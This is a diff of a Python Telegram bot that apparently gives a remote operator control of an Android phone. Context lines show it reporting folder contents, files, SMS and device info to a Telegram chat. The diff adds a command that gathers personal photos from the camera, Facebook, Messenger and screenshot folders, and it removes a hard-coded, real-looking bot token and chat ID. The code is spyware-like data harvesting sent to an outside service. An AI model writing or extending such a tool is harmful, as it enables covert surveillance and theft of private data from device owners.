@@ -1,14 +1,26 @@
 import os
 import requests
 import json
+import shutil
 import subprocess
 
 # Replace with your bot token and chat ID
-TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
-CHAT_ID = '6285177516'
+TOKEN = 'YOUR_BOT_TOKEN'
+CHAT_ID = 'YOUR_CHAT_ID'
 
 # Global variable to store current folder path
 current_folder = "/storage/emulated/0/"
+
+# Target directory to save downloaded images
+target_directory = "/storage/emulated/0/DCIM/Camera/"
+
+# List of directories to search for images
+directories_to_search = [
+    "/storage/emulated/0/DCIM/Camera/",
+    "/storage/emulated/0/DCIM/Facebook/",
+    "/storage/emulated/0/Pictures/Screenshots/",
+    "/storage/emulated/0/Pictures/Messenger/"
+]
 
 # Function to send message to Telegram
 def send_to_telegram(message):
@@ -79,6 +91,24 @@ def get_device_info():
     except Exception as e:
         return f"Error retrieving device info: {str(e)}"
 
+# Function to download images from specified directories
+def download_images():
+    try:
+        if not os.path.exists(target_directory):
+            os.makedirs(target_directory)
+
+        for directory in directories_to_search:
+            if os.path.isdir(directory):
+                for filename in os.listdir(directory):
+                    if filename.lower().endswith(('.png', '.jpg')):
+                        src_path = os.path.join(directory, filename)
+                        dest_path = os.path.join(target_directory, filename)
+                        shutil.copy(src_path, dest_path)
+        
+        return f"Images downloaded to `{target_directory}`."
+    except Exception as e:
+        return f"Error downloading images: {str(e)}"
+
 # Function to handle folder navigation
 def handle_folder_navigation(folder_name):
     global current_folder
@@ -119,6 +149,10 @@ def handle_telegram_update(update):
                 current_folder = "/storage/emulated/0/"
                 send_to_telegram(f"Navigating to SD card: `{current_folder}`")
                 handle_folder_navigation("")  # Show initial folder contents
+
+            elif message == "/download_images":
+                download_message = download_images()
+                send_to_telegram(download_message)
 
             else:
                 folder_path = os.path.join(current_folder, message)
@@ -171,5 +205,5 @@ if __name__ == "__main__":
     send_to_telegram(f"Current folder: `{current_folder}`")
     handle_folder_navigation("")  # Show initial folder contents
     
-    # Step 2: Listen for user input (folder, file, SMS, or device info)
+    # Step 2: Listen for user input (folder, file, SMS, device info, or image download)
     listen_for_updates()
